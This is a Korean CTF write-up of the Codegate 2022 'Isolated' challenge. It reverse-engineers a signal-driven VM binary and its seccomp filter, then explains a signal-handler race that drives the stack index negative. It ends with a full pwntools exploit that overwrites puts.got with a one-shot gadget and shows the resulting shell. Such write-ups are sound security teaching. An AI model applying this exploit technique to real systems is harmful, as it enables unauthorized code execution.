---
title: "[Codegate CTF 2022] Isolated"
date: 2022-07-06 23:25:37
tags:
categories: [Security, CTF]
---

## 개요

> Simple VM, But isloated.

[<i class="fa-solid fa-file"></i> chall.zip](/uploads/codegate22-isolated/chall.zip)


## 문제 분석

64비트 x86_64 바이너리 `isolated` 와 `Dockerfile` 등이 주어집니다. 바이너리는 심볼이 strip되어 있고, Canary, NX, PIE 보호 기법이 적용되어 있습니다.

```bash
$ checksec isolated
[*] '/home/user/study/ctf/codegate22/isolated/isolated'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

바이너리를 실행하면 로고를 출력하고 opcode를 입력받습니다. 아무 문자열이나 입력했더니 `SIGKILL` 시그널을 받고 종료합니다. 로고의 'VM'이나, opcode를 입력받는다는 점에서 가상머신을 묘사한 바이너리임을 추측할 수 있습니다.

```
./isolated
   __   __        __       ___  ___  __
| /__` /  \ |    /  \  /\   |  |__  |  \    __    \  /  |\/|
| .__/ \__/ |___ \__/ /~~\  |  |___ |__/           \/   |  |

opcodes >aaaa
[1]    1544809 killed     ./isolated
```

`main` 함수를 살펴보면 다음과 같습니다. 12행에서 `code` 를 768바이트 입력받고, 13행에서 `context` 구조체를 할당합니다. 14행에서 `fork` 시스템 콜을 호출하여 자식 프로세스는 `run` 함수를 호출하고, 부모 프로세스는 `set_signal_handlers` 프로세스를 호출하도록 합니다.

```c
__int64 __fastcall main()
{
  unsigned int ppid; // edi
  unsigned int len; // [rsp+8h] [rbp-18h]
  char *code; // [rsp+10h] [rbp-10h]
  struct context *context; // [rsp+18h] [rbp-8h]

  setup();
  loading();
  code = (char *)malloc(0x301uLL);
  printf("opcodes >");
  len = read(0, code, 0x300uLL);
  context = (struct context *)mmap(0LL, 8uLL, 3, 33, -1, 0LL);// mmap(0, 8, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0)
  if ( !fork() )                                // child process
  {
    sleep(1u);
    alarm(8u);
    ppid = getppid();
    run(ppid, code, len, context);
  }
  alarm(8u);
  set_signal_handlers(context);                 // parent process
}
```

`context` 구조체는 가상머신의 상태를 나타내는 구조체입니다. 명령어의 실행 상태를 나타내는 열거형 변수 `state` 와 인자를 전달받고 결과를 대입하는 용도로 사용하는 정수형 변수 `reg` 를 멤버로 가지고 있습니다.

```c
struct context
{
  enum state state;
  u32 reg;
};
```

열거형 `state` 는 다음과 같이 명령어가 실행 중임을 나타내는 `LOCKED` , 명령어 실행에 성공했음을 나타내는 `SUCCESS` , 실행 중 오류가 발생했음을 나타내는 `ERROR` 로 구분됩니다. `state` 의 사용은 이후 분석할 함수들에서 자세히 살펴볼 수 있습니다.

```c
enum state : unsigned __int32
{
  LOCKED = 0x1,
  SUCCESS = 0x2,
  ERROR = 0x3,
};
```

부모 프로세스에서 호출하는 `set_signal_handlers` 함수는 전역 변수 `g_context` 에 앞서 할당한 `context` 구조체를 대입합니다. 이후 각각의 시그널 번호에 해당하는 핸들러 함수를 등록하고 무한 루프에 진입합니다.

```c
void __fastcall __noreturn set_signal_handlers(struct context *context) // 0x1766
{
  g_context = context;
  signal(1, (__sighandler_t)push_handler);
  signal(2, (__sighandler_t)pop_handler);
  signal(3, (__sighandler_t)clean_handler);
  signal(4, (__sighandler_t)log_handler);
  while ( 1 )
    ;
}
```

자식 프로세스에서 호출하는 `run` 함수는 `setup_seccomp` 함수를 호출하고 `send_locked` 함수를 통해 `CLEAN` 명령어를 실행한 후, 입력받은 opcode를 파싱하여 각각의 명령어를 실행합니다. 파싱한 opcode에 해당하는 명령어가 없으면 `send` 함수를 통해 부모 프로세스에 `SIGKILL` 시그널을 전송하여 종료합니다. 주석 처리하여 생략한 "opcode handlers" 부분이 가상머신이 명령어를 처리하는 부분으로, 이 부분은 가상머신의 전체 구조를 먼저 살펴본 후 분석하겠습니다.

```c
void __fastcall __noreturn run(unsigned int ppid, char *code, unsigned int len, struct context *context)  // 0xe2d
{
  // ...
  setup_seccomp(62, 0xC000003E, 1u);
  send_locked(ppid, context, CLEAN, 0);
  pc = 0;
  eflags = 0;
  while ( pc < len )
  {
    op = pc++;
    switch ( code[op] )
    {
      /* ... opcode handlers ... */
      default:
        send(ppid, context, (enum signal)9u, 0);// SIGKILL
        exit(-1);
    }
  }
  send(ppid, context, (enum signal)9u, 0);      // SIGKILL
  exit(-1);
}
```

`setup_seccomp` 함수는 `prctl` 시스템 콜을 호출하여 다른 시스템 콜을 필터링하도록 하는데, seccomp-tools 도구를 사용하면 바이너리에 설정된 필터링 정책을 쉽게 분석할 수 있습니다.

```c
void __fastcall setup_seccomp(int a1, int a2, unsigned __int16 a3)  // 0xc70
{
  // ...
  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) )
  {
    perror("prctl(NO_NEW_PRIVS)");
  }
  else if ( prctl(22, 2LL, &v3) )
  {
    perror("prctl(PR_SET_SECCOMP)");            // prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER))
  }
}
```

[@preview](https://github.com/david942j/seccomp-tools)

다음과 같이 seccomp-tools 를 실행한 결과, `kill` 시스템 콜이 아니면 모두 필터링함을 알 수 있습니다. 따라서 자식 프로세스를 `execve` 등의 시스템 콜을 사용하여 익스플로잇하는 것은 불가능하며, 부모 프로세스를 익스플로잇하여 셸을 획득해야 함을 추측할 수 있습니다.

```bash
$ seccomp-tools dump ./isolated
# ...
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0005
 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0005: 0x06 0x00 0x00 0x00000001  return KILL
```

`run` 함수는 명령어 실행 및 `SIGKILL` 시그널 전송 등에 `send_locked` 와 `send` 두 가지 함수를 동시에 사용하고 있습니다. 먼저 `send` 함수를 살펴보면 `context->state` 를 `LOCKED` 로 설정하고, 인자 `arg` 를 `context->reg` 에 대입한 후 `kill` 시스템 콜을 호출하여 부모 프로세스에 시그널을 전송합니다.

```c
void __fastcall send(__pid_t ppid, struct context *context, enum signal signum, int arg)  // 0xda4
{
  context->state = LOCKED;
  context->reg = arg;
  kill(ppid, signum);
}
```

이 때 `signum` 에 해당하는 시그널 번호는 다음과 같이 `signal` 열거형 중 하나 또는 9 (`SIGKILL`)로, `PUSH` , `POP` , `CLEAN` , `LOG` 가 각각의 명령어에 해당합니다. 따라서 바이너리가 묘사하는 가상머신은 자식 프로세스가 명령어와 인자를 시그널로 전송하면, 부모 프로세스에서 해당하는 핸들러 함수를 호출하여 처리하는 구조임을 알 수 있습니다.

```c
enum signal : unsigned __int32
{
  PUSH = 0x1,
  POP = 0x2,
  CLEAN = 0x3,
  LOG = 0x4,
};
```

다음으로 `send_blocked` 함수는 동일하게 `send` 함수를 호출하여 시그널을 전송한 이후, `context->state` 가 `LOCKED` 인 동안 루프에 진입하는 busy waiting을 수행합니다. 이후 분석할 부모 프로세스의 핸들러 함수들은 모두 명령어 실행 루틴 이후 `context->state` 를 `SUCCESS` 또는 `ERROR` 로 설정합니다. `send` 함수가 `context->state` 를 `LOCKED` 로 설정한 이상 핸들러 함수가 루틴을 종료할 때까지 `send_blocked` 함수는 무한 대기하므로, 이 함수는 명령어를 일종의 블로킹(blocking) 방식으로 실행하도록 한다고 생각할 수 있겠습니다.

```c
void __fastcall send_locked(unsigned int ppid, struct context *context, enum signal signum, unsigned int arg)   // 0xddf
{
  send(ppid, context, signum, arg);
  while ( context->state == LOCKED )            // busy waiting while being processed
    ;
  if ( context->state == ERROR )
    context->reg = -1;
}
```

이번에는 부모 프로세스에서 각각의 명령어를 처리하는 핸들러 함수를 살펴보겠습니다. 모든 핸들러 함수에서 공통적으로 사용하는 전역 변수는 다음과 같습니다.

1. `stack` - 정수형 전역 배열로, 원소 1543개 크기입니다.
2. `g_stack_idx` - 스택 포인터의 역할을 하는 정수형 전역 변수로, 이 변수의 값을 인덱스로 `stack` 에 접근합니다.
3. `log_enabled` - 전역 변수로, 값이 0이 아닌 경우 핸들러 함수가 로그를 출력합니다.

`push_handler` 함수는 `g_stack_idx` 가 767보다 작거나 같은 경우 1을 증가시키고, `stack[g_stack_idx]` 에 인자로 전달된 `g_context->reg` 를 대입합니다. 

```c
void push_handler() // 0x15c2
{
  int stack_idx; // eax

  if ( g_stack_idx > 767 )
  {
    g_context->state = ERROR;
  }
  else
  {
    if ( log_enabled )
      printf("[*] PUSH stack[0x%x] = 0x%x\n", (unsigned int)g_stack_idx, g_context->reg);
    stack_idx = g_stack_idx++;
    stack[stack_idx] = g_context->reg;
    g_context->state = SUCCESS;
  }
}
```

`pop_handler` 함수는 `g_stack_idx` 가 0이 아닌 경우 1을 감소시키고, `stack[g_stack_idx]` 를 `g_context->reg` 에 대입합니다.

```c
void pop_handler()  // 0x164d
{
  if ( g_stack_idx )
  {
    if ( log_enabled )
      printf("[*] POP stack[0x%x] == 0x%x\n", (unsigned int)(g_stack_idx - 1), stack[g_stack_idx - 1]);
    g_context->reg = stack[--g_stack_idx];
    g_context->state = SUCCESS;
  }
  else
  {
    g_context->state = ERROR;
  }
}
```

`clean_handler` 함수는 `g_stack_idx` 를 0으로 초기화시킵니다.

```c
void clean_handler()  // 0x16f7
{
  if ( log_enabled )
    puts("[*] CLEAN STACK");
  stack[0] = 0;
  g_stack_idx = 0;
  g_context->state = SUCCESS;
}
```

`log_handler` 함수는 `log_enabled` 에 `g_context->reg` 를 대입합니다.

```c
void log_handler()  // 0x1736
{
  puts("[!] I prepared log feature for you :)");
  log_enabled = g_context->reg;
  g_context->state = SUCCESS;
}
```

가상머신의 전체 구조를 훑어보았습니다. 이제 다시 자식 프로세스로 돌아가 `run` 함수에서 opcode를 파싱하는 코드를 살펴보겠습니다. `run` 함수는 switch 구문을 반복하면서 파싱을 수행하는데, 각각의 case 블록에서 공통적인 부분은 다음과 같습니다.

1. `PUSH` 를 제외한 인자가 있는 opcode는 인자를 opcode에 포함하여 전달할지, ` stack` 에서 `POP` 하여 전달할지 플래그 값을 통해 선택할 수 있습니다.
    - 플래그 값이 `\x66` 이면 opcode가 인자를 포함하고 있고, `\x55` 면 `send_locked` 함수를 호출하여 `POP` 명령을 수행한 후 결과를 인자로 전달합니다.
2. `ADD` , `SUB` , `MUL` , `DIV` , `CMP` 는 opcode의 구조가 완전히 동일하며, 이 중 `CMP` 를 제외한 나머지는 `send_locked` 함수를 호출하여 결과를 `stack` 에 `PUSH` 합니다.

다음은 opcode를 파싱하는 switch 구문입니다. 각각의 opcode는 첫 바이트가 종류를 나타내며 case에 해당합니다. 나머지 바이트들은 주석에 나타낸 바와 같이 플래그 값과 경우에 따라 인자들로 구성되어 있습니다.

```c
switch ( code[op] )
{
  case 0:                                   // PUSH [u32 arg1]
    push_arg1 = *(_DWORD *)&code[pc];
    pc += 4;
    send(ppid, context, PUSH, push_arg1);
    break;
  case 1:                                   // POP
    send(ppid, context, POP, 0);
    break;
  case 2:                                   // ADD [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]
                                            // add two arguments and push
    _pc = pc;
    v21 = pc + 1;
    add_flag1 = code[_pc];
    if ( add_flag1 == 0x66 )
    {
      add_arg1 = *(_DWORD *)&code[v21];
      v21 += 4;
    }
    else
    {
      if ( add_flag1 != 0x55 )
        exit(-1);
      send_locked(ppid, context, POP, 0);
      add_arg1 = context->reg;
    }
    v6 = v21;
    pc = v21 + 1;
    add_flag2 = code[v6];
    if ( add_flag2 == 0x66 )
    {
      add_arg2 = *(_DWORD *)&code[pc];
      pc += 4;
    }
    else
    {
      if ( add_flag2 != 0x55 )
        exit(-1);
      send_locked(ppid, context, POP, 0);
      add_arg2 = context->reg;
    }
    send_locked(ppid, context, PUSH, add_arg2 + add_arg1);
    break;
  case 3:                                   // SUB [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]
                                            // subtract two arguments and push
    // ...
  case 4:                                   // MUL [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]
                                            // multiply two arguments and push
    // ...
  case 5:                                   // DIV [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]
                                            // divide two arguments and push
    // ...
  case 6:                                   // CMP [u8 flag1] [optional u32 arg1] [u8 flag2] [optional u32 arg2]
                                            // compare two arguments and save result to eflags
    // ...
  // ...
  case 9:                                   // CLEAN
    send_locked(ppid, context, CLEAN, 0);
    break;
  case 10:                                  // LOG [u8 arg1] [u32 optional arg2]
    // ...
  default:
    send(ppid, context, (enum signal)9u, 0);// SIGKILL
    exit(-1);
}
```


## 문제 풀이

자식 프로세스의 시스템 콜 필터링으로 인해 앞서 언급한 바와 같이 부모 프로세스를 익스플로잇해야 합니다. 익스플로잇은 다음과 같은 취약점을 바탕으로 수행합니다.

1. `g_stack_idx` 의 자료형이 `int` 로, `push_handler` 와 `pop_handler` 함수에서 충분하지 않은 경계 검사를 수행하고 있습니다.
    - `g_stack_idx` 의 값을 음수로 만들 수 있다면 두 함수의 경계 검사를 모두 통과하여, `stack` 보다 낮은 주소의 메모리에 대한 읽기와 쓰기가 가능합니다.
2. `PUSH` 와 `POP` opcode는 블로킹 방식의 `send_blocked` 함수가 아닌 `send` 함수를 호출하고 있습니다.

`run` 함수의 switch 구문을 보면 `PUSH` 와 `POP` opcode를 처리하는 case 블록에서 단순히 `send` 함수를 호출하여 시그널을 전송하도록 하고 있습니다. `send` 함수는 `send_blocked` 함수와 달리 부모 프로세스에서 실행 중인 핸들러 함수가 종료할 때까지 기다리는 메커니즘이 존재하지 않아, 연속하여 호출할 경우 의도하지 않은 결과를 일으킬 수 있습니다.

```c
switch ( code[op] )
{
  case 0:                                   // PUSH [u32 arg1]
    push_arg1 = *(_DWORD *)&code[pc];
    pc += 4;
    send(ppid, context, PUSH, push_arg1);
    break;
  case 1:                                   // POP
    send(ppid, context, POP, 0);
    break;
  // ...
```

시그널 핸들러로의 흐름 전환은 유저 모드의 코드를 실행하고 있는 한 언제나 발생할 수 있습니다. 따라서 원칙적으로 핸들러 함수는 재진입성이 보장되어야(reentrant) 하며, 최소한 시그널의 전달 자체만이라도 블로킹 방식으로 이루어져야 합니다. 여기서 재진입성의 보장이란 핸들러 함수를 실행하는 도중 임의 시점에서 시그널을 받아 함수 내부에서 같은 핸들러 함수를 호출하더라도, 기존 핸들러 함수의 실행 결과에 영향을 주지 않아야 함을 의미합니다.

그러나 `push_handler` 와 `pop_handler` 함수에서 이루어지는 `g_stack_idx` 전역 변수에 대한 증감 연산은 원자적이지 않을(non-atomic) 뿐더러, 시그널의 전송 과정도 블로킹 방식을 사용하고 있지 않습니다. 예를 들어 `g_stack_idx` 의 값이 1이고 두 개의 `POP` opcode를 파싱하여 시그널을 전송하는 상황을 생각해보겠습니다. 만약 전송이 블로킹 방식으로 이루어졌다면 다음과 같이 `pop_handler` 의 조건문에 의해 `g_stack_idx` 의 값은 음수가 될 수 없습니다.

![1.png](/images/codegate22-isolated/1.png)

그런데 블로킹 방식이 아닌 상황에서는 `pop_handler` 의 조건문을 통과한 상태에서 다음과 같이 추가적인 시그널에 인한 재진입이 발생할 수 있습니다. 이 경우 재진입한 핸들러를 포함하여 `g_stack_idx` 에 대한 증감 연산이 두 번 모두 이루어져 값이 음수가 될 수 있습니다.

![2.png](/images/codegate22-isolated/2.png)

`push_handler` 와 `pop_handler` 는 각각 `g_stack_idx` 가 767보다 작거나 같은지, 0이 아닌지만 검사합니다. 따라서 일단  `g_stack_idx` 의 값을 음수로 만들고 나면 연속된 `POP` opcode 등으로 얼마든지 값을 감소시켜, `stack` 보다 낮은 주소의 메모리에 대한 자유로운 읽기와 쓰기가 가능해집니다. `puts.got` 는 `stack` 보다 낮은 주소에 있고 `puts` 라이브러리 함수의 주소가 저장되어 있으므로, `SUB` opcode 등을 이용하여 oneshot 가젯의 주소로 변조하면 셸을 획득할 수 있습니다.

다음은 위의 내용을 바탕으로 작성한 익스플로잇 코드입니다. 37행은 `CLEAN` , 2번의 `PUSH` , 3번의 `POP` 을 반복하여 `g_stack_idx` 의 값이 음수가 되도록 합니다. 46행은 블로킹 방식의 `POP` 을 반복하여 `puts.got` 를 참조할 수 있도록 `g_stack_idx` 를 감소시키는데, 반복 횟수는 실행 환경에 따라 시행착오를 거쳐야 합니다. 52행은 `SUB` opcode를 사용해 `puts.got` 에 oneshot 가젯의 주소를 대입합니다. 익스플로잇 코드를 성공할 때까지 수차례 실행하면 셸을 획득할 수 있습니다.

```python
#!/usr/bin/python3
from pwn import *

r = remote("localhost", 7777)
# r = process("./isolated")

def pop():
    return p8(1)


def __opcode(op, pop1, pop2, args=[0, 0]):
    s = p8(op) + (p8(0x55) if pop1 else p8(0x66) + p32(args[0]))
    s += (p8(0x55) if pop2 else p8(0x66) + p32(args[1]))

    return s


def sub(pop1, pop2, args=[0, 0]):
    return __opcode(3, pop1, pop2, args)


def cmp(pop1, pop2, args=[0, 0]):
    return __opcode(6, pop1, pop2, args)


def clean():
    return p8(9)


def log(pop, arg=0):
    return p8(10) + (p8(0x55) if pop else p8(0x66) + p32(arg))


def main():
    # start race
    payload = log(False, 1)
    for i in range(10):
        payload += clean()
        payload += sub(False, False, [0, 0])
        payload += sub(False, False, [0, 0])
        payload += pop()
        payload += pop()
        payload += pop()

    # set stack_idx to -59
    for i in range(27):
        payload += cmp(True, True)
    for i in range(10):
        payload += sub(True, False, [0, 0])

    # set puts.got to oneshot
    payload += sub(True, False, [0, 0x3166e])

    # trigger oneshot
    payload += log(False, 1)

    r.sendafter(b"opcodes >", payload)

    r.interactive()

if __name__ == "__main__":
    main()
```

```bash
$ ./ex.py
[+] Opening connection to localhost on port 7777: Done
[*] Switching to interactive mode
[!] I prepared log feature for you :)
# ...
[*] POP stack[0xffffffc5] == 0xf7a62aa0
[*] PUSH stack[0xffffffc5] = 0xf7a31432
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```


## 참고자료

[1] M. Dowd, J. McDonald and J. Schuh, “Chapter 13. Synchronization and State,” in *The Art of Software Security Assessment: Identifying and Preventing Software Vulnerabilities*. Boston, MA: Addison-Wesley, 2006, pp. 797-821.